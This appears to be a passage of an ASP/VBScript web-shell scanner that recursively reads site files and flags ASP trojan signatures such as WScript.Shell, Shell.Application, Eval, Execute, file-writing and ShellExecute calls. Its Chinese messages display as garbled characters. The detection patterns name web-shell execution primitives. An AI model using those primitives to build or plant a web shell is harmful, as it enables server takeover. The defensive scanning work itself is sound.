Function GetDateCreate(filepath)
	Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFile(filepath) 
	s = f.DateCreated 
	set f = nothing
	set fso = nothing
	GetDateCreate = s
End Function

Function tURLEncode(Str)
	temp = Replace(Str, "%", "%25")
	temp = Replace(temp, "#", "%23")
	temp = Replace(temp, "&", "%26")
	tURLEncode = temp
End Function
%>
<%
Sub ShowAllFile(Path)
	If Not Response.IsClientConnected Then Response.End()
	Set FSO = CreateObject("Scripting.FileSystemObject")
	if not fso.FolderExists(path) then exit sub
	Set f = FSO.GetFolder(Path)
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(FSO.GetExtensionName(path&"\"&myfile.name)) Then
			Call ScanFile(Path&Temp&"\"&myfile.name, "")
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set FSO = Nothing
End Sub

Sub ScanFile(FilePath, InFile)
	If InFile <> "" Then
		Infiles = "<font color=red>���ļ���<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile & "</a>�ļ�����ִ��</font>"
	End If
	temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(FilePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
	on error resume next
	Set tStream = Server.CreateObject("ADODB.Stream")
	tStream.type = 1
	tStream.mode = 3
	tStream.open
	tStream.Position=0
	tStream.LoadFromFile FilePath
	If err Then Exit Sub end if
	tStream.type = 2
	tStream.charset = "GB2312"
	Do Until tStream.EOS
		filetxt = filetxt & LCase(replace(tStream.ReadText(102400), Chr(0), ""))
	Loop
	tStream.close()
	Set tStream = Nothing

	Set FSOs = CreateObject("Scripting.FileSystemObject")	
	if len(filetxt) >0 then
		filetxt = vbcrlf & filetxt
			
			If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>WScr"&DoMyBest&"ipt.Shell ���� clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td><font color=red>Σ�������һ�㱻ASPľ������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End if
			
			If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>She"&DoMyBest&"ll.Application ���� clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td><font color=red>Σ�������һ�㱻ASPľ������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			If instr( filetxt, chr(-22048)) then
				Report = Report&"<tr><td>"&temp&"</td><td>��</td><td><font color=red>ʹ�� Unicode ���� ASP ����</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			Set regEx = New RegExp
			regEx.IgnoreCase = True
			regEx.Global = True
			regEx.Pattern = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>�ƺ��ű��������ˣ�һ��ASP�ļ��ǲ�����ܵ�<a href=plugins/decoder.asp?path="&server.URLEncode(filepath)&" target=_blank>[����]</a></font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "\bEv"&"al\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Ev"&"al</td><td>e"&"val()��������ִ������ASP���룬��һЩ�������á�����ʽһ���ǣ�ev"&"al(X)<br>����javascript������Ҳ����ʹ�ã��п������󱨡�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "[^.]\bExe"&"cute\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Exec"&"ute</td><td><font color=red>e"&"xecute()��������ִ������ASP���룬��һЩ�������á�����ʽһ���ǣ�ex"&"ecute(X)</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "\.(Open|Create)TextFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Crea"&"teTextFile|.O"&"penTextFile</td><td>ʹ����FSO��CreateTextFile|OpenTextFile������д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "\.SaveT"&"oFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Sa"&"veToFile</td><td>ʹ����Stream����JMail��SaveToFile����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "\.Sa"&"ve\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Sa"&"ve</td><td>ʹ����XMLHTTP��Save����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
		
			regEx.Pattern = "set\s*.*\s*=\s*server\s"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Set xxx=Se"&"rver</td><td><font color=red>����Set xxx=Ser" & jj & "ver�������Ա��ϸ����Ƿ����.execute</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			
			regEx.Pattern = "Server.(Ex"&"ecute|Transfer)([ \t]*|\()[^""]\)"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Server.Ex"&"ecute</td><td><font color=red>���ܸ��ټ��Server.e"&"xecute()����ִ�е��ļ��������Ա���м��</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
		
			regEx.Pattern = "\.R"&"un\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Ru"&"n</td><td><font color=red>���� WScript �� Run ����</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
	
			regEx.Pattern = "\.Ex"&"ec\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Ex"&"ec</td><td><font color=red>���� WScript �� Exec ����</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
		
			regEx.Pattern = "\.Shel"&"lExecute\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.ShellE"&"xecute</td><td><font color=red>���� Application �� ShellExecute ����</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
			End If
			Set regEx = Nothing
			
	
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*file\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSOs.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		
		
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*file\s*=\s*'.*'"
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, "'") + 1, Len(Match.Value) - Instr(Match.Value, "'") - 1),"/","\")
			If Not CheckExt(FSOs.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		
		'Check include virtual with "
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSOs.GetExtensionName(tFile)) Then
				Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		
		
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*'.*'"
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, "'") + 1, Len(Match.Value) - Instr(Match.Value, "'") - 1),"/","\")
			If Not CheckExt(FSOs.GetExtensionName(tFile)) Then
				Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
				
	
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSOs.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
			
	
		Set XregEx = New RegExp
		XregEx.IgnoreCase = True
		XregEx.Global = True
		XregEx.Pattern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
		Set XMatches = XregEx.Execute(filetxt)
		For Each Match in XMatches
			tmpLake2 = Mid(Match.Value, 1, InStr(Match.Value, ">"))
			srcSeek = InStr(1, tmpLake2, "src", 1)
			If srcSeek > 0 Then
				srcSeek2 = instr(srcSeek, tmpLake2, "=")
				For i = 1 To 50
					tmp = Mid(tmpLake2, srcSeek2 + i, 1)
					If tmp <> " " and tmp <> chr(9) and tmp <> vbCrLf Then
						Exit For
					End If
				Next
				If tmp = """" Then
					tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, """") - srcSeek2 - i - 1)
				Else
					If InStr(srcSeek2 + i + 1, tmpLake2, " ") > 0 Then tmpName = Mid(tmpLake2, srcSeek2 + i, Instr(srcSeek2 + i + 1, tmpLake2, " ") - srcSeek2 - i) Else tmpName = tmpLake2
					If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)
					If InStr(tmpName, vbCrLf) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, vbcrlf) - 1)
					If InStr(tmpName, ">") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, ">") - 1)
				End If
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tmpName , replace(FilePath,server.MapPath("\")&"\","",1,1,1))
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing

	end if
		set fsos = nothing

End Sub

%>